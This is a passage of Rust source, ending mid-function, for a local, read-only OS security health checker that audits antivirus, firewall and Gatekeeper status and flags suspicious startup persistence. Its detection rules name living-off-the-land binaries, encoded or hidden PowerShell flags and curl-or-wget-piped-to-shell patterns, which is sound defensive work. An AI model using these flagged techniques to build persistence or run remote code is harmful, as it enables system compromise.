//! Lightweight, 100% local OS Security Health Check (#10).
//! Read-only inspection of OS protections (Defender/SecurityCenter2/Firewall on Windows,
//! Gatekeeper/XProtect/Firewall on macOS, UFW/firewalld on Linux) and suspicious startup
//! persistence entries. Performs ZERO outbound network calls.

use crate::cmdline;
use crate::error::{AppError, AppResult};
use crate::safety;
use serde::{Deserialize, Serialize};
use std::path::Path;
use std::time::{SystemTime, UNIX_EPOCH};

#[derive(Serialize, Clone, Debug, PartialEq, Eq)]
pub struct SecurityCheckItem {
    pub id: String,
    pub label: String,
    pub status: String, // "ok" | "warning" | "critical" | "unavailable"
    pub detail: String,
}

#[derive(Serialize, Clone, Debug, PartialEq, Eq)]
pub struct SuspiciousStartupEntry {
    pub scope: String,
    pub name: String,
    pub command: String,
    pub reason: String,
    pub severity: String, // "high" | "medium" | "low"
}

#[derive(Serialize, Clone, Debug, PartialEq, Eq)]
pub struct OsSecurityHealthReport {
    pub platform: String,
    pub overall_status: String, // "healthy" | "attention" | "warning"
    pub summary: String,
    pub antivirus_enabled: Option<bool>,
    pub antivirus_name: Option<String>,
    pub firewall_enabled: Option<bool>,
    pub gatekeeper_enabled: Option<bool>,
    pub xprotect_version: Option<String>,
    pub checks: Vec<SecurityCheckItem>,
    pub suspicious_entries: Vec<SuspiciousStartupEntry>,
    pub checked_at: u64,
    pub local_only: bool,
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct WindowsSecurityParsed {
    pub defender_enabled: Option<bool>,
    pub defender_realtime: Option<bool>,
    pub defender_signatures_out_of_date: Option<bool>,
    pub third_party_av_name: Option<String>,
    pub third_party_av_enabled: Option<bool>,
    pub third_party_av_up_to_date: Option<bool>,
    pub firewall_enabled: Option<bool>,
    pub firewall_profiles_summary: String,
}

/// Decodes Windows SecurityCenter2 `AntiVirusProduct.productState` bitmask.
/// Returns `(enabled, up_to_date)`.
/// Bits 12..=15 (`0x1` = enabled/on, `0x0`/`0x2` = off/snoozed);
/// Bits 4..=7 (`0x0` = up-to-date, `0x1` = out-of-date).
pub fn decode_security_center_product_state(state: u32) -> (bool, bool) {
    let scanner_state = (state >> 12) & 0xF;
    let sig_state = (state >> 4) & 0xF;
    let enabled = scanner_state == 0x1;
    let up_to_date = sig_state == 0x0;
    (enabled, up_to_date)
}

fn deserialize_opt_ps_bool<'de, D>(deserializer: D) -> Result<Option<bool>, D::Error>
where
    D: serde::Deserializer<'de>,
{
    struct PsBoolVisitor;

    impl<'de> serde::de::Visitor<'de> for PsBoolVisitor {
        type Value = Option<bool>;

        fn expecting(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
            f.write_str("a boolean, integer (0/1), or boolean string")
        }

        fn visit_none<E>(self) -> Result<Self::Value, E> {
            Ok(None)
        }

        fn visit_unit<E>(self) -> Result<Self::Value, E> {
            Ok(None)
        }

        fn visit_some<D2>(self, deserializer: D2) -> Result<Self::Value, D2::Error>
        where
            D2: serde::Deserializer<'de>,
        {
            deserializer.deserialize_any(PsBoolVisitor)
        }

        fn visit_bool<E>(self, v: bool) -> Result<Self::Value, E> {
            Ok(Some(v))
        }

        fn visit_i64<E>(self, v: i64) -> Result<Self::Value, E> {
            Ok(Some(v != 0))
        }

        fn visit_u64<E>(self, v: u64) -> Result<Self::Value, E> {
            Ok(Some(v != 0))
        }

        fn visit_f64<E>(self, v: f64) -> Result<Self::Value, E> {
            Ok(Some(v != 0.0))
        }

        fn visit_str<E>(self, v: &str) -> Result<Self::Value, E> {
            let trimmed = v.trim().to_ascii_lowercase();
            match trimmed.as_str() {
                "true" | "1" | "yes" | "enabled" | "on" => Ok(Some(true)),
                "false" | "0" | "no" | "disabled" | "off" => Ok(Some(false)),
                _ => Ok(None),
            }
        }
    }

    deserializer.deserialize_any(PsBoolVisitor)
}

#[derive(Deserialize, Default)]
struct RawMpStatus {
    #[serde(rename = "AntivirusEnabled", default, deserialize_with = "deserialize_opt_ps_bool")]
    antivirus_enabled: Option<bool>,
    #[serde(rename = "RealTimeProtectionEnabled", default, deserialize_with = "deserialize_opt_ps_bool")]
    realtime_enabled: Option<bool>,
    #[serde(rename = "DefenderSignaturesOutOfDate", default, deserialize_with = "deserialize_opt_ps_bool")]
    signatures_out_of_date: Option<bool>,
}

#[derive(Deserialize, Default)]
struct RawSecurityCenterAv {
    #[serde(rename = "displayName", default)]
    display_name: String,
    #[serde(rename = "productState", default)]
    product_state: u32,
}

#[derive(Deserialize, Default)]
struct RawFirewallProfile {
    #[serde(rename = "Name", default)]
    name: String,
    #[serde(rename = "Enabled", default, deserialize_with = "deserialize_opt_ps_bool")]
    enabled: Option<bool>,
}

fn parse_one_or_many<T: for<'de> Deserialize<'de>>(val: Option<&serde_json::Value>) -> Vec<T> {
    let Some(v) = val else {
        return Vec::new();
    };
    if v.is_null() {
        return Vec::new();
    }
    if v.is_array() {
        serde_json::from_value::<Vec<T>>(v.clone()).unwrap_or_default()
    } else if v.is_object() {
        serde_json::from_value::<T>(v.clone()).into_iter().collect()
    } else {
        Vec::new()
    }
}

pub fn parse_windows_security_json(raw: &str) -> WindowsSecurityParsed {
    let mut parsed = WindowsSecurityParsed::default();
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return parsed;
    }
    let Ok(root) = serde_json::from_str::<serde_json::Value>(trimmed) else {
        return parsed;
    };

    if let Some(mp_val) = root.get("defender").filter(|v| v.is_object()) {
        if let Ok(mp) = serde_json::from_value::<RawMpStatus>(mp_val.clone()) {
            parsed.defender_enabled = mp.antivirus_enabled;
            parsed.defender_realtime = mp.realtime_enabled;
            parsed.defender_signatures_out_of_date = mp.signatures_out_of_date;
        }
    }

    let avs: Vec<RawSecurityCenterAv> = parse_one_or_many(root.get("av_products"));
    let mut best_av: Option<(String, bool, bool)> = None;
    for av in avs {
        let name = av.display_name.trim().to_string();
        if name.is_empty() {
            continue;
        }
        let (enabled, up_to_date) = decode_security_center_product_state(av.product_state);
        let replace = match &best_av {
            None => true,
            Some((_, prev_en, _)) => !*prev_en && enabled,
        };
        if replace {
            best_av = Some((name, enabled, up_to_date));
        }
    }
    if let Some((name, en, up)) = best_av {
        parsed.third_party_av_name = Some(name);
        parsed.third_party_av_enabled = Some(en);
        parsed.third_party_av_up_to_date = Some(up);
    }

    let fw_profiles: Vec<RawFirewallProfile> = parse_one_or_many(root.get("firewall"));
    if !fw_profiles.is_empty() {
        let mut enabled_names = Vec::new();
        let mut disabled_names = Vec::new();
        for p in fw_profiles {
            let label = if p.name.trim().is_empty() {
                "Profile".to_string()
            } else {
                p.name.trim().to_string()
            };
            match p.enabled {
                Some(true) => enabled_names.push(label),
                Some(false) => disabled_names.push(label),
                None => {}
            }
        }
        if !enabled_names.is_empty() || !disabled_names.is_empty() {
            parsed.firewall_enabled = Some(!enabled_names.is_empty() && disabled_names.is_empty());
            if disabled_names.is_empty() {
                parsed.firewall_profiles_summary = format!("Active ({})", enabled_names.join(", "));
            } else if enabled_names.is_empty() {
                parsed.firewall_profiles_summary =
                    format!("Disabled ({})", disabled_names.join(", "));
            } else {
                parsed.firewall_profiles_summary = format!(
                    "Partial: {} on; {} off",
                    enabled_names.join(", "),
                    disabled_names.join(", ")
                );
            }
        }
    }

    parsed
}

fn is_abs_or_win_drive(p: &str) -> bool {
    let bytes = p.as_bytes();
    Path::new(p).is_absolute()
        || (bytes.len() >= 3
            && bytes[0].is_ascii_alphabetic()
            && bytes[1] == b':'
            && (bytes[2] == b'\\' || bytes[2] == b'/'))
}

fn contains_cli_flag(lower_args: &str, flag: &str) -> bool {
    let bytes = lower_args.as_bytes();
    let mut start = 0;
    while let Some(pos) = lower_args[start..].find(flag) {
        let abs = start + pos;
        let end = abs + flag.len();
        let before_ok = abs == 0 || !bytes[abs - 1].is_ascii_alphanumeric();
        let after_ok = end == bytes.len()
            || bytes[end].is_ascii_whitespace()
            || matches!(bytes[end], b'"' | b'\'' | b':' | b'=' | b';');
        if before_ok && after_ok {
            return true;
        }
        start = abs + 1;
    }
    false
}

fn contains_delimited_word(lower_args: &str, word: &str) -> bool {
    let bytes = lower_args.as_bytes();
    let mut start = 0;
    while let Some(pos) = lower_args[start..].find(word) {
        let abs = start + pos;
        let end = abs + word.len();
        let before_ok = abs == 0
            || (!bytes[abs - 1].is_ascii_alphanumeric()
                && !matches!(bytes[abs - 1], b'_' | b'\\' | b'/'));
        let after_ok = end == bytes.len()
            || (!bytes[end].is_ascii_alphanumeric() && bytes[end] != b'_');
        if before_ok && after_ok {
            return true;
        }
        start = abs + 1;
    }
    false
}

fn contains_script_extension(lower_args: &str, ext: &str) -> bool {
    let bytes = lower_args.as_bytes();
    let mut start = 0;
    while let Some(pos) = lower_args[start..].find(ext) {
        let abs = start + pos;
        let end = abs + ext.len();
        let after_ok = end == bytes.len()
            || bytes[end].is_ascii_whitespace()
            || matches!(
                bytes[end],
                b'"' | b'\'' | b',' | b';' | b')' | b'&' | b'|' | b'>' | b'<'
            );
        if after_ok {
            return true;
        }
        start = abs + 1;
    }
    false
}

pub fn inspect_windows_run_entry(
    scope: &str,
    name: &str,
    command: &str,
) -> Option<SuspiciousStartupEntry> {
    let trimmed_cmd = command.trim();
    if trimmed_cmd.is_empty() {
        return None;
    }
    let expanded = cmdline::expand_env(trimmed_cmd);
    let (raw_exe, raw_args) = cmdline::split_command(&expanded);
    let exe_clean = raw_exe.trim();
    let lower_cmd = expanded.to_ascii_lowercase();
    let lower_exe = exe_clean.to_ascii_lowercase();
    let lower_args = raw_args.to_ascii_lowercase();

    let exe_base = Path::new(exe_clean)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(exe_clean)
        .to_ascii_lowercase();

    let is_lolbin = matches!(
        exe_base.as_str(),
        "powershell"
            | "powershell.exe"
            | "pwsh"
            | "pwsh.exe"
            | "cmd"
            | "cmd.exe"
            | "wscript"
            | "wscript.exe"
            | "cscript"
            | "cscript.exe"
            | "mshta"
            | "mshta.exe"
            | "rundll32"
            | "rundll32.exe"
            | "regsvr32"
            | "regsvr32.exe"
            | "certutil"
            | "certutil.exe"
            | "bitsadmin"
            | "bitsadmin.exe"
    );

    let has_obfuscation_or_remote = contains_cli_flag(&lower_args, "-enc")
        || contains_cli_flag(&lower_args, "/enc")
        || contains_cli_flag(&lower_args, "-encodedcommand")
        || contains_cli_flag(&lower_args, "/encodedcommand")
        || lower_args.contains("frombase64string")
        || lower_args.contains("windowstyle hidden")
        || contains_cli_flag(&lower_args, "-w") && lower_args.contains("hidden")
        || contains_delimited_word(&lower_args, "iex")
        || contains_delimited_word(&lower_args, "invoke-expression")
        || lower_args.contains("http://")
        || lower_args.contains("https://");

    let has_script_ext = [".vbs", ".vbe", ".js", ".jse", ".ps1", ".hta", ".bat", ".cmd"]
        .iter()
        .any(|ext| lower_exe.ends_with(ext) || contains_script_extension(&lower_args, ext));

    if is_lolbin && (has_obfuscation_or_remote || has_script_ext) {
        return Some(SuspiciousStartupEntry {
            scope: scope.to_string(),
            name: name.to_string(),
            command: trimmed_cmd.to_string(),
            reason: "Script or living-off-the-land host launched with hidden, encoded, remote, or script arguments.".to_string(),
            severity: "high".to_string(),
        });
    }

    let in_staging_dir = [
        r"\windows\temp\",
        r"\appdata\local\temp\",
        r"\temp\",
        r"\users\public\",
        r"\downloads\",
        r"\$recycle.bin\",
    ]
    .iter()
    .any(|marker| lower_exe.contains(marker) || lower_cmd.contains(marker));

    if in_staging_dir {
        return Some(SuspiciousStartupEntry {
            scope: scope.to_string(),
            name: name.to_string(),
            command: trimmed_cmd.to_string(),
            reason: "Startup entry points to a temporary, Public, or Downloads staging folder.".to_string(),
            severity: "high".to_string(),
        });
    }

    // Script file directly registered in Run key (even outside staging dir)
    if [".vbs", ".vbe", ".js", ".jse", ".ps1", ".hta"]
        .iter()
        .any(|ext| lower_exe.ends_with(ext))
    {
        return Some(SuspiciousStartupEntry {
            scope: scope.to_string(),
            name: name.to_string(),
            command: trimmed_cmd.to_string(),
            reason: "Startup entry executes a raw script file directly at logon.".to_string(),
            severity: "medium".to_string(),
        });
    }

    // Missing absolute binary target (skip unresolved %VAR% and bare system command names)
    if !exe_clean.contains('%') && is_abs_or_win_drive(exe_clean) && !Path::new(exe_clean).exists() {
        return Some(SuspiciousStartupEntry {
            scope: scope.to_string(),
            name: name.to_string(),
            command: trimmed_cmd.to_string(),
            reason: "Startup target executable is missing on disk (orphaned or removed binary).".to_string(),
            severity: "low".to_string(),
        });
    }

    None
}

#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
pub fn parse_gatekeeper_status(output: &str) -> Option<bool> {
    let lower = output.to_ascii_lowercase();
    if lower.contains("assessments enabled") {
        Some(true)
    } else if lower.contains("assessments disabled") {
        Some(false)
    } else {
        None
    }
}

#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
pub fn parse_plist_short_version(plist_xml: &str) -> Option<String> {
    for key in ["CFBundleShortVersionString", "CFBundleVersion"] {
        let needle = format!("<key>{key}</key>");
        if let Some(idx) = plist_xml.find(&needle) {
            let rest = &plist_xml[idx + needle.len()..];
            if let Some(s_start) = rest.find("<string>") {
                let after = &rest[s_start + 8..];
                if let Some(s_end) = after.find("</string>") {
                    let val = after[..s_end].trim();
                    if !val.is_empty() {
                        return Some(val.to_string());
                    }
                }
            }
        }
    }
    None
}

#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
pub fn parse_socketfilterfw_state(output: &str) -> Option<bool> {
    let lower = output.to_ascii_lowercase();
    if lower.contains("enabled") {
        Some(true)
    } else if lower.contains("disabled") {
        Some(false)
    } else {
        None
    }
}

#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
pub fn inspect_macos_launch_agent(
    scope: &str,
    file_name: &str,
    plist_xml: &str,
) -> Option<SuspiciousStartupEntry> {
    let lower = plist_xml.to_ascii_lowercase();
    let suspicious_path = ["/tmp/", "/var/tmp/", "/users/shared/", "/private/tmp/"]
        .iter()
        .any(|p| lower.contains(p));
    let remote_pipe = (lower.contains("curl ") || lower.contains("wget "))
        && (lower.contains("| sh") || lower.contains("| bash") || lower.contains("|sh") || lower.contains("|bash"));
    let osascript_inline = lower.contains("osascript") && lower.contains("-e");
    let hidden_exec = lower.contains("/.") && (lower.contains("<string>/") || lower.contains("programarguments"));

    if suspicious_path || remote_pipe || osascript_inline || hidden_exec {
        let reason = if remote_pipe {
            "LaunchAgent downloads and pipes remote content into a shell."
        } else if osascript_inline {
            "LaunchAgent invokes inline osascript at login."
        } else if suspicious_path {
            "LaunchAgent executes from /tmp, /var/tmp, or /Users/Shared."
        } else {
            "LaunchAgent references a hidden dotfile executable."
        };
        return Some(SuspiciousStartupEntry {
            scope: scope.to_string(),
            name: file_name.to_string(),
            command: file_name.to_string(),
            reason: reason.to_string(),
            severity: if remote_pipe || suspicious_path { "high" } else { "medium" }.to_string(),
        });
    }
    None
}

#[cfg_attr(not(all(unix, not(target_os = "macos"))), allow(dead_code))]
pub fn parse_linux_firewall_status(
    ufw_out: Option<&str>,
    ufw_conf: Option<&str>,
    firewalld_out: Option<&str>,
) -> (Option<bool>, String) {
    if let Some(raw) = ufw_out {
        let lower = raw.to_ascii_lowercase();
        if lower.contains("status: active") {
            return (Some(true), "UFW firewall is active".to_string());
        }
        if lower.contains("status: inactive") {
            return (Some(false), "UFW firewall is inactive".to_string());
        }
    }
    if let Some(conf) = ufw_conf {
        for line in conf.lines() {
            let t = line.trim();
            if t.starts_with('#') {
                continue;
            }
            if let Some((k, v)) = t.split_once('=') {
                if k.trim().eq_ignore_ascii_case("ENABLED") {
                    let val = v.trim().trim_matches('"').to_ascii_lowercase();
                    if val == "yes" {
                        return (Some(true), "UFW firewall enabled (ufw.conf)".to_string());
                    } else if val == "no" {
                        return (Some(false), "UFW firewall disabled (ufw.conf)".to_string());
                    }
                }
            }
        }
    }
    if let Some(fwd) = firewalld_out {
        let lower = fwd.trim().to_ascii_lowercase();
        if lower == "running" {
            return (Some(true), "firewalld is running".to_string());
        }
        if lower == "not running" {
            return (Some(false), "firewalld is not running".to_string());
        }
    }
    (
        None,
        "No local UFW or firewalld status accessible without root privileges.".to_string(),
    )
}

#[cfg_attr(not(all(unix, not(target_os = "macos"))), allow(dead_code))]
pub fn inspect_linux_autostart_entry(
    scope: &str,
    file_name: &str,
    content: &str,
) -> Option<SuspiciousStartupEntry> {
    let mut exec_line = String::new();
    for line in content.lines() {
        let t = line.trim();
        if let Some(val) = t.strip_prefix("Exec=") {
            exec_line = val.trim().to_string();
            break;
        }
    }
    if exec_line.is_empty() {
        return None;
    }
    let lower = exec_line.to_ascii_lowercase();
    let in_tmp = ["/tmp/", "/var/tmp/", "/dev/shm/"]
        .iter()
        .any(|m| lower.contains(m));
    let remote_pipe = (lower.contains("curl ") || lower.contains("wget "))
        && (lower.contains("| sh") || lower.contains("| bash"));
    if in_tmp || remote_pipe {
        return Some(SuspiciousStartupEntry {
            scope: scope.to_string(),
            name: file_name.to_string(),
            command: exec_line,
            reason: if remote_pipe {
                "Autostart desktop entry fetches and executes remote shell code."
            } else {
                "Autostart desktop entry executes a binary from /tmp or /dev/shm."
            }
            .to_string(),
            severity: "high".to_string(),
        });
    }
    None
}

pub fn build_security_health_report(
    platform: &str,
    antivirus_enabled: Option<bool>,
    antivirus_name: Option<String>,
    firewall_enabled: Option<bool>,
    gatekeeper_enabled: Option<bool>,
    xprotect_version: Option<String>,
    mut checks: Vec<SecurityCheckItem>,
    suspicious_entries: Vec<SuspiciousStartupEntry>,
    checked_at: u64,
) -> OsSecurityHealthReport {
    let high_count = suspicious_entries
        .iter()
        .filter(|s| s.severity == "high")
        .count();
    let med_count = suspicious_entries
        .iter()
        .filter(|s| s.severity == "medium")
        .count();

    let persistence_check = if suspicious_entries.is_empty() {
        SecurityCheckItem {
            id: "startup_persistence".to_string(),
            label: "Startup Persistence Audit".to_string(),
            status: "ok".to_string(),
            detail: "No suspicious startup scripts or staging-directory persistence entries detected.".to_string(),
        }
    } else if high_count > 0 {
        SecurityCheckItem {
            id: "startup_persistence".to_string(),
            label: "Startup Persistence Audit".to_string(),
            status: "critical".to_string(),
            detail: format!(
                "{} flagged startup persistence entr{} ({high_count} high-risk).",
                suspicious_entries.len(),
                if suspicious_entries.len() == 1 { "y" } else { "ies" }
            ),
        }
    } else {
        SecurityCheckItem {
            id: "startup_persistence".to_string(),
            label: "Startup Persistence Audit".to_string(),
            status: "warning".to_string(),
            detail: format!(
                "{} startup entr{} flagged for review.",
                suspicious_entries.len(),
                if suspicious_entries.len() == 1 { "y" } else { "ies" }
            ),
        }
    };
    checks.push(persistence_check);

    let has_critical = checks.iter().any(|c| c.status == "critical");
    let has_warning = checks.iter().any(|c| c.status == "warning");

    let overall_status = if has_critical || high_count > 0 {
        "warning".to_string()
    } else if has_warning || med_count > 0 {
        "attention".to_string()
    } else {
        "healthy".to_string()
    };

    let summary = match overall_status.as_str() {
        "warning" => "One or more critical OS protections are disabled or high-risk startup entries were found.".to_string(),
        "attention" => "Core protections look mostly healthy, with minor items worth reviewing.".to_string(),
        _ => "All inspected local OS protections and startup persistence checks look healthy.".to_string(),
    };

    OsSecurityHealthReport {
        platform: platform.to_string(),
        overall_status,
        summary,
        antivirus_enabled,
        antivirus_name,
        firewall_enabled,
        gatekeeper_enabled,
        xprotect_version,
        checks,
        suspicious_entries,
        checked_at,
        local_only: true,
    }
}

fn now_secs() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

pub fn evaluate_windows_av_status(
    parsed: &WindowsSecurityParsed,
) -> (Option<bool>, Option<String>, &'static str, String) {
    match (
        parsed.third_party_av_name.as_ref(),
        parsed.third_party_av_enabled,
        parsed.defender_enabled,
        parsed.defender_realtime,
    ) {
        (Some(name), Some(true), _, _) if !name.eq_ignore_ascii_case("Windows Defender") => {
            let sig_note = if parsed.third_party_av_up_to_date == Some(false) {
                " (definitions out of date)"
            } else {
                ""
            };
            (
                Some(true),
                Some(name.clone()),
                if parsed.third_party_av_up_to_date == Some(false) {
                    "warning"
                } else {
                    "ok"
                },
                format!("{name} active{sig_note}"),
            )
        }
        (_, _, Some(true), Some(true)) => {
            let sig_note = if parsed.defender_signatures_out_of_date == Some(true) {
                " (definitions out of date)"
            } else {
                ""
            };
            (
                Some(true),
                Some("Microsoft Defender Antivirus".to_string()),
                if parsed.defender_signatures_out_of_date == Some(true) {
                    "warning"
                } else {
                    "ok"
                },
                format!("Real-time protection enabled{sig_note}"),
            )
        }
        (_, _, Some(en), rt) => (
            Some(en && rt.unwrap_or(false)),
            Some("Microsoft Defender Antivirus".to_string()),
            "critical",
            "Microsoft Defender real-time protection is turned off.".to_string(),
        ),
        (Some(name), Some(true), None, _) => {
            let sig_note = if parsed.third_party_av_up_to_date == Some(false) {
                " (definitions out of date)"
            } else {
                ""
            };
            (
                Some(true),
                Some(name.clone()),
                if parsed.third_party_av_up_to_date == Some(false) {
                    "warning"
                } else {
                    "ok"
                },
                format!("{name} active{sig_note}"),
            )
        }
        (Some(name), Some(false), _, _) => (
            Some(false),
            Some(name.clone()),
            "critical",
            format!("{name} reports protection disabled."),
        ),
        _ => (
            None,
            None,
            "unavailable",
            "Could not query Windows Security Center or Defender status.".to_string(),
        ),
    }
}

#[cfg(target_os = "windows")]
fn collect_windows_security_health() -> OsSecurityHealthReport {
    use std::os::windows::process::CommandExt;
    use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
    use winreg::RegKey;

    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    let ps_script = r#"
$res = @{ defender = $null; av_products = @(); firewall = @() }
try {
  $mp = Get-MpComputerStatus -ErrorAction Stop | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, DefenderSignaturesOutOfDate
  $res.defender = $mp
} catch {}
try {
  $av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction Stop | Select-Object displayName, productState
  if ($av) { $res.av_products = @($av) }
} catch {}
try {
  $fw = Get-NetFirewallProfile -ErrorAction Stop | Select-Object Name, Enabled
  if ($fw) { $res.firewall = @($fw) }
} catch {}
$res | ConvertTo-Json -Depth 4 -Compress
"#;

    let ps_json = std::process::Command::new(safety::system_powershell_path())
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-WindowStyle",
            "Hidden",
            "-Command",
            ps_script,
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .ok()
        .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
        .unwrap_or_default();

    let parsed = parse_windows_security_json(&ps_json);
    let (av_enabled, av_name, av_status, av_detail) = evaluate_windows_av_status(&parsed);

    let (fw_status, fw_detail) = match parsed.firewall_enabled {
        Some(true) => ("ok", parsed.firewall_profiles_summary.clone()),
        Some(false) => (
            "critical",
            if parsed.firewall_profiles_summary.is_empty() {
                "Windows Firewall is disabled on one or more network profiles.".to_string()
            } else {
                parsed.firewall_profiles_summary.clone()
            },
        ),
        None => (
            "unavailable",
            "Could not inspect Windows Firewall profiles.".to_string(),
        ),
    };

    let checks = vec![
        SecurityCheckItem {
            id: "av".to_string(),
            label: "Antivirus & Real-Time Protection".to_string(),
            status: av_status.to_string(),
            detail: av_detail,
        },
        SecurityCheckItem {
            id: "firewall".to_string(),
            label: "Windows Defender Firewall".to_string(),
            status: fw_status.to_string(),
            detail: fw_detail,
        },
    ];

    let mut suspicious_entries = Vec::new();
    let run_paths: &[(&str, winreg::HKEY, &str)] = &[
        (
            "HKCU\\Run",
            HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
        ),
        (
            "HKCU\\RunOnce",
            HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
        ),
        (
            "HKLM\\Run",
            HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        ),
        (
            "HKLM\\RunOnce",
            HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        ),
        (
            "HKLM\\WOW6432Node\\Run",
            HKEY_LOCAL_MACHINE,
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
        ),
    ];

    for (scope, hive, subkey) in run_paths {
        if let Ok(key) = RegKey::predef(*hive).open_subkey(subkey) {
            for (name, val) in key.enum_values().flatten() {
                if let Some(finding) = inspect_windows_run_entry(scope, &name, &val.to_string()) {
                    suspicious_entries.push(finding);
                }
            }
        }
    }

    build_security_health_report(
        "windows",
        av_enabled,
        av_name,
        parsed.firewall_enabled,
        None,
        None,
        checks,
        suspicious_entries,
        now_secs(),
    )
}

#[cfg(target_os = "macos")]
fn collect_macos_security_health() -> OsSecurityHealthReport {
    let spctl_out = std::process::Command::new("spctl")
        .arg("--status")
        .output()
        .ok()
        .map(|o| {
            format!(
                "{}\n{}",
                String::from_utf8_lossy(&o.stdout),
                String::from_utf8_lossy(&o.stderr)
            )
        })
        .unwrap_or_default();
    let gatekeeper_enabled = parse_gatekeeper_status(&spctl_out);

    let xprotect_version = [
        "/Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Info.plist",
        "/System/Library/CoreServices/XProtect.bundle/Contents/Info.plist",
    ]
    .iter()
    .find_map(|p| std::fs::read_to_string(p).ok().and_then(|xml| parse_plist_short_version(&xml)));

    let fw_out = std::process::Command::new("/usr/libexec/ApplicationFirewall/socketfilterfw")
        .arg("--getglobalstate")
        .output()
        .ok()
        .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
        .unwrap_or_default();
    let firewall_enabled = parse_socketfilterfw_state(&fw_out);

    let mut checks = vec![
        SecurityCheckItem {
            id: "gatekeeper".to_string(),
            label: "Gatekeeper App Verification".to_string(),
            status: match gatekeeper_enabled {
                Some(true) => "ok",
                Some(false) => "critical",
                None => "unavailable",
            }
            .to_string(),
            detail: match gatekeeper_enabled {
                Some(true) => "Gatekeeper assessments enabled.".to_string(),
                Some(false) => "Gatekeeper assessments are disabled.".to_string(),
                None => "Could not determine Gatekeeper status.".to_string(),
            },
        },
        SecurityCheckItem {
            id: "xprotect".to_string(),
            label: "XProtect Malware Signatures".to_string(),
            status: if xprotect_version.is_some() {
                "ok"
            } else {
                "unavailable"
            }
            .to_string(),
            detail: xprotect_version
                .as_ref()
                .map(|v| format!("XProtect v{v} installed"))
                .unwrap_or_else(|| "XProtect bundle metadata not found.".to_string()),
        },
        SecurityCheckItem {
            id: "firewall".to_string(),
            label: "macOS Application Firewall".to_string(),
            status: match firewall_enabled {
                Some(true) => "ok",
                Some(false) => "warning",
                None => "unavailable",
            }
            .to_string(),
            detail: match firewall_enabled {
                Some(true) => "Application Firewall is enabled.".to_string(),
                Some(false) => "Application Firewall is disabled.".to_string(),
                None => "Could not query Application Firewall state.".to_string(),
            },
        },
    ];

    let mut suspicious_entries = Vec::new();
    let mut agent_dirs: Vec<(&str, std::path::PathBuf)> =
        vec![("/Library/LaunchAgents", std::path::PathBuf::from("/Library/LaunchAgents"))];
    if let Some(home) = dirs::home_dir() {
        agent_dirs.push(("~/Library/LaunchAgents", home.join("Library/LaunchAgents")));
    }
    for (scope, dir) in agent_dirs {
        let Ok(rd) = std::fs::read_dir(&dir) else { continue };
        for entry in rd.flatten() {
            let p = entry.path();
            if p.extension().and_then(|e| e.to_str()) != Some("plist") {
                continue;
            }
            let Ok(md) = std::fs::symlink_metadata(&p) else { continue };
            if !md.is_file() || safety::metadata_is_link_like(&md) || md.len() > 256 * 1024 {
                continue;
            }
            if let Ok(xml) = std::fs::read_to_string(&p) {
                let fname = entry.file_name().to_string_lossy().into_owned();
                if let Some(finding) = inspect_macos_launch_agent(scope, &fname, &xml) {
                    suspicious_entries.push(finding);
                }
            }
        }
    }

    let _ = &mut checks;
    build_security_health_report(
        "macos",
        xprotect_version.as_ref().map(|_| true),
        xprotect_version
            .as_ref()
            .map(|v| format!("Apple XProtect v{v}")),
        firewall_enabled,
        gatekeeper_enabled,
        xprotect_version,
        checks,
        suspicious_entries,
        now_secs(),
    )
}

#[cfg(all(unix, not(target_os = "macos")))]
fn collect_linux_security_health() -> OsSecurityHealthReport {
    let ufw_out = std::process::Command::new("ufw")
        .arg("status")
        .output()
        .ok()
        .map(|o| String::from_utf8_lossy(&o.stdout).into_owned());
    let ufw_conf = std::fs::read_to_string("/etc/ufw/ufw.conf").ok();
    let firewalld_out = std::process::Command::new("firewall-cmd")
        .arg("--state")
        .output()
        .ok()
        .map(|o| String::from_utf8_lossy(&o.stdout).into_owned());

    let (fw_enabled, fw_detail) = parse_linux_firewall_status(
        ufw_out.as_deref(),
        ufw_conf.as_deref(),
        firewalld_out.as_deref(),
    );

    let checks = vec![SecurityCheckItem {
        id: "firewall".to_string(),
        label: "Linux Host Firewall (UFW / firewalld)".to_string(),
        status: match fw_enabled {
            Some(true) => "ok",
            Some(false) => "warning",
            None => "unavailable",
        }
        .to_string(),
        detail: fw_detail,
    }];

    let mut suspicious_entries = Vec::new();
    let mut autostart_dirs = vec![("/etc/xdg/autostart", std::path::PathBuf::from("/etc/xdg/autostart"))];
    if let Some(cfg) = dirs::config_dir() {
        autostart_dirs.push(("~/.config/autostart", cfg.join("autostart")));
    } else if let Some(home) = dirs::home_dir() {
        autostart_dirs.push(("~/.config/autostart", home.join(".config/autostart")));
    }
    for (scope, dir) in autostart_dirs {
        let Ok(rd) = std::fs::read_dir(&dir) else { continue };
        for entry in rd.flatten() {
            let p = entry.path();
            if p.extension().and_then(|e| e.to_str()) != Some("desktop") {
                continue;
            }
            let Ok(md) = std::fs::symlink_metadata(&p) else { continue };
            if !md.is_file() || safety::metadata_is_link_like(&md) || md.len() > 128 * 1024 {
                continue;
            }
            if let Ok(raw) = std::fs::read_to_string(&p) {
